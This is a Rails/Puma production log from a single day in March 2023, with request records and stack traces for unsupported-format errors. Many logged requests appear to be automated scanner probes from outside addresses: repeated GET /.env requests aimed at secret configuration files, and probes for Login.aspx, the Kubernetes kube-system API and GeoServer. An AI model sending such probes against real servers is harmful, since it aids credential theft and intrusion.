I, [2023-03-09T09:33:29.944374 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T09:33:29.945405 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.5ms | Allocations: 299)
I, [2023-03-09T09:33:29.945652 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.8ms | Allocations: 522)
I, [2023-03-09T09:40:32.763434 #2274953]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-09 09:40:32 +0900
I, [2023-03-09T09:40:32.764036 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T09:40:32.764466 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T09:40:32.765168 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T09:40:32.765346 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T09:42:29.857293 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 09:42:29 +0900
I, [2023-03-09T09:42:29.857918 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T09:42:29.857960 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T09:42:29.858382 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T09:42:29.859263 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T09:42:29.859477 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 505)
I, [2023-03-09T10:26:31.104135 #2274953]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 10:26:31 +0900
I, [2023-03-09T10:26:31.104776 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T10:26:31.104818 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T10:26:31.105295 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T10:26:31.106290 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T10:26:31.106470 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-09T10:26:31.650991 #2274955]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 10:26:31 +0900
F, [2023-03-09T10:26:31.651434 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T10:42:13.919314 #2274955]  INFO -- : Started GET "/.env" for 20.70.211.45 at 2023-03-09 10:42:13 +0900
I, [2023-03-09T10:42:13.920381 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T10:42:13.920444 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T10:42:13.920936 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T10:42:13.921578 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T10:42:13.921748 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T10:42:14.239367 #2274953]  INFO -- : Started POST "/" for 20.70.211.45 at 2023-03-09 10:42:14 +0900
F, [2023-03-09T10:42:14.239789 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T10:59:54.613433 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 10:59:54 +0900
I, [2023-03-09T10:59:54.614186 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T10:59:54.614231 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T10:59:54.614642 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T10:59:54.615391 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T10:59:54.615536 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 505)
I, [2023-03-09T12:01:46.378819 #2274953]  INFO -- : Started GET "/" for 128.1.34.58 at 2023-03-09 12:01:46 +0900
I, [2023-03-09T12:01:46.379551 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T12:01:46.380251 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T12:01:46.381744 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.5ms | Allocations: 298)
I, [2023-03-09T12:01:46.382219 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 2.1ms | Allocations: 513)
I, [2023-03-09T12:02:15.883205 #2274953]  INFO -- : Started GET "/sitemap.xml" for 128.1.34.58 at 2023-03-09 12:02:15 +0900
I, [2023-03-09T12:02:15.883801 #2274953]  INFO -- : Processing by UserController#index as XML
I, [2023-03-09T12:02:15.883840 #2274953]  INFO -- :   Parameters: {"all"=>"sitemap"}
I, [2023-03-09T12:02:15.884243 #2274953]  INFO -- : Completed 406 Not Acceptable in 0ms (Allocations: 186)
F, [2023-03-09T12:02:15.884947 #2274953] FATAL -- :   
ActionController::UnknownFormat (UserController#index is missing a template for this request format and variant.

request.formats: ["application/xml"]
request.variant: []):
  
actionpack (6.1.4.4) lib/action_controller/metal/implicit_render.rb:42:in `default_render'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `block in send_action'
<internal:kernel>:90:in `tap'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `send_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:228:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rendering.rb:30:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:42:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:117:in `block in run_callbacks'
actiontext (6.1.4.4) lib/action_text/rendering.rb:20:in `with_renderer'
actiontext (6.1.4.4) lib/action_text/engine.rb:59:in `block (4 levels) in <class:Engine>'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `instance_exec'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `block in run_callbacks'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
rack (2.2.3) lib/rack/etag.rb:27:in `call'
rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
rack (2.2.3) lib/rack/head.rb:12:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
railties (6.1.4.4) lib/rails/rack/logger.rb:28:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
rack (2.2.3) lib/rack/method_override.rb:24:in `call'
rack (2.2.3) lib/rack/runtime.rb:22:in `call'
activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:113:in `call'
railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
puma (5.6.5) lib/puma/configuration.rb:252:in `call'
puma (5.6.5) lib/puma/request.rb:77:in `block in handle_request'
puma (5.6.5) lib/puma/thread_pool.rb:340:in `with_force_shutdown'
puma (5.6.5) lib/puma/request.rb:76:in `handle_request'
puma (5.6.5) lib/puma/server.rb:443:in `process_client'
puma (5.6.5) lib/puma/thread_pool.rb:147:in `block in spawn_thread'
I, [2023-03-09T12:17:22.567121 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 12:17:22 +0900
I, [2023-03-09T12:17:22.567708 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T12:17:22.567746 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T12:17:22.568154 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T12:17:22.568778 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-03-09T12:17:22.568960 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 504)
I, [2023-03-09T13:00:57.305541 #2274953]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 13:00:57 +0900
I, [2023-03-09T13:00:57.306284 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T13:00:57.306329 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T13:00:57.306753 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T13:00:57.307499 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T13:00:57.307671 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T13:00:57.863992 #2274955]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 13:00:57 +0900
F, [2023-03-09T13:00:57.864349 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T13:17:23.576313 #2274955]  INFO -- : Started GET "/.env" for 20.228.190.236 at 2023-03-09 13:17:23 +0900
I, [2023-03-09T13:17:23.577071 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T13:17:23.577119 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T13:17:23.577919 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T13:17:23.578974 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-03-09T13:17:23.579168 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-09T13:34:22.309878 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 13:34:22 +0900
I, [2023-03-09T13:34:22.310584 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T13:34:22.310631 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T13:34:22.311081 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T13:34:22.311710 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T13:34:22.311854 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-09T13:39:39.273191 #2274955]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-09 13:39:39 +0900
I, [2023-03-09T13:39:39.273801 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T13:39:39.274245 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T13:39:39.274882 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T13:39:39.275050 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T13:40:31.371773 #2274955]  INFO -- : Started GET "/" for 193.32.162.159 at 2023-03-09 13:40:31 +0900
I, [2023-03-09T13:40:31.372417 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T13:40:31.372860 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T13:40:31.373663 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T13:40:31.375301 #2274955]  INFO -- : Completed 200 OK in 3ms (Views: 2.6ms | Allocations: 521)
I, [2023-03-09T13:56:15.038046 #2274955]  INFO -- : Started GET "/" for 170.254.73.240 at 2023-03-09 13:56:15 +0900
I, [2023-03-09T13:56:15.039033 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T13:56:15.039781 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T13:56:15.040473 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T13:56:15.040650 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 513)
I, [2023-03-09T14:02:54.166821 #2274955]  INFO -- : Started GET "/" for 34.76.96.55 at 2023-03-09 14:02:54 +0900
I, [2023-03-09T14:02:54.167431 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T14:02:54.167868 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T14:02:54.168757 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T14:02:54.168975 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T14:03:32.015238 #2274955]  INFO -- : Started GET "/apis/apps/v1/namespaces/kube-system/daemonsets" for 45.134.140.161 at 2023-03-09 14:03:32 +0900
I, [2023-03-09T14:03:32.015942 #2274955]  INFO -- : Processing by UserController#index as JSON
I, [2023-03-09T14:03:32.015998 #2274955]  INFO -- :   Parameters: {"all"=>"apis/apps/v1/namespaces/kube-system/daemonsets"}
I, [2023-03-09T14:03:32.017535 #2274955]  INFO -- : Completed 406 Not Acceptable in 1ms (Allocations: 186)
F, [2023-03-09T14:03:32.018721 #2274955] FATAL -- :   
ActionController::UnknownFormat (UserController#index is missing a template for this request format and variant.

request.formats: ["application/json"]
request.variant: []):
  
actionpack (6.1.4.4) lib/action_controller/metal/implicit_render.rb:42:in `default_render'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `block in send_action'
<internal:kernel>:90:in `tap'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `send_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:228:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rendering.rb:30:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:42:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:117:in `block in run_callbacks'
actiontext (6.1.4.4) lib/action_text/rendering.rb:20:in `with_renderer'
actiontext (6.1.4.4) lib/action_text/engine.rb:59:in `block (4 levels) in <class:Engine>'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `instance_exec'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `block in run_callbacks'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
rack (2.2.3) lib/rack/etag.rb:27:in `call'
rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
rack (2.2.3) lib/rack/head.rb:12:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
railties (6.1.4.4) lib/rails/rack/logger.rb:28:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
rack (2.2.3) lib/rack/method_override.rb:24:in `call'
rack (2.2.3) lib/rack/runtime.rb:22:in `call'
activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:113:in `call'
railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
puma (5.6.5) lib/puma/configuration.rb:252:in `call'
puma (5.6.5) lib/puma/request.rb:77:in `block in handle_request'
puma (5.6.5) lib/puma/thread_pool.rb:340:in `with_force_shutdown'
puma (5.6.5) lib/puma/request.rb:76:in `handle_request'
puma (5.6.5) lib/puma/server.rb:443:in `process_client'
puma (5.6.5) lib/puma/thread_pool.rb:147:in `block in spawn_thread'
I, [2023-03-09T14:18:54.758331 #2274955]  INFO -- : Started GET "/v3/time" for 104.192.0.50 at 2023-03-09 14:18:54 +0900
I, [2023-03-09T14:18:54.758931 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T14:18:54.758969 #2274955]  INFO -- :   Parameters: {"all"=>"v3/time"}
I, [2023-03-09T14:18:54.760321 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T14:18:54.761227 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T14:18:54.761397 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 512)
I, [2023-03-09T14:25:33.836026 #2274955]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 14:25:33 +0900
I, [2023-03-09T14:25:33.836670 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T14:25:33.836712 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T14:25:33.837212 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T14:25:33.837851 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T14:25:33.838023 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T14:25:34.364771 #2274953]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 14:25:34 +0900
F, [2023-03-09T14:25:34.365131 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T14:29:31.679659 #2274953]  INFO -- : Started GET "/" for 205.210.31.28 at 2023-03-09 14:29:31 +0900
I, [2023-03-09T14:29:31.680396 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T14:29:31.680830 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T14:29:31.681483 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T14:29:31.681641 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-03-09T14:51:30.812774 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 14:51:30 +0900
I, [2023-03-09T14:51:30.813509 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T14:51:30.813555 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T14:51:30.813967 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T14:51:30.815275 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 298)
I, [2023-03-09T14:51:30.815444 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.6ms | Allocations: 504)
I, [2023-03-09T15:10:57.482490 #2274953]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-09 15:10:57 +0900
I, [2023-03-09T15:10:57.483098 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T15:10:57.483138 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T15:10:57.483647 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T15:10:57.484391 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T15:10:57.484567 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T15:10:58.233055 #2274955]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-09 15:10:58 +0900
F, [2023-03-09T15:10:58.233401 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T15:20:58.183666 #2274955]  INFO -- : Started GET "/" for 65.49.20.66 at 2023-03-09 15:20:58 +0900
I, [2023-03-09T15:20:58.184279 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T15:20:58.184808 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T15:20:58.185456 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T15:20:58.185625 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T15:25:32.807997 #2274955]  INFO -- : Started GET "/geoserver/web/" for 65.49.20.66 at 2023-03-09 15:25:32 +0900
I, [2023-03-09T15:25:32.808610 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T15:25:32.808648 #2274955]  INFO -- :   Parameters: {"all"=>"geoserver/web"}
I, [2023-03-09T15:25:32.809236 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T15:25:32.809864 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T15:25:32.810033 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T15:46:13.358605 #2274955]  INFO -- : Started GET "/" for 104.152.52.147 at 2023-03-09 15:46:13 +0900
I, [2023-03-09T15:46:13.359307 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T15:46:13.359789 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T15:46:13.360447 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T15:46:13.360631 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T16:09:13.788394 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 16:09:13 +0900
I, [2023-03-09T16:09:13.789049 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T16:09:13.789093 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T16:09:13.789510 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T16:09:13.790482 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T16:09:13.790630 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.3ms | Allocations: 505)
I, [2023-03-09T16:22:28.769649 #2274955]  INFO -- : Started GET "/" for 192.241.218.40 at 2023-03-09 16:22:28 +0900
I, [2023-03-09T16:22:28.770412 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T16:22:28.770880 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T16:22:28.771521 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T16:22:28.772479 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 522)
I, [2023-03-09T16:28:16.285065 #2274955]  INFO -- : Started GET "/0bef" for 172.105.77.209 at 2023-03-09 16:28:16 +0900
I, [2023-03-09T16:28:16.285773 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T16:28:16.285818 #2274955]  INFO -- :   Parameters: {"all"=>"0bef"}
